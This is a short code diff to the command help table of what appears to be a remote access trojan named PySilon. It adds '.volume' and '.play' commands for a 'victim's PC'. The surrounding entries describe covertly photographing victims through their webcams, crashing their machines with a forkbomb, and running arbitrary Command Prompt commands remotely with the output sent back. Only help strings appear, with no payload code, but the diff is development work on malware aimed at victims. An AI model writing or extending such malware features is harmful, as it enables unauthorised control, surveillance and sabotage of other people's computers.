@@ -403,6 +403,8 @@ help = {
         'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
         'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
         'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
+        'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
+        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC (You must upload the file to the PySilon directory first).'],
         'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
         'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
         'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
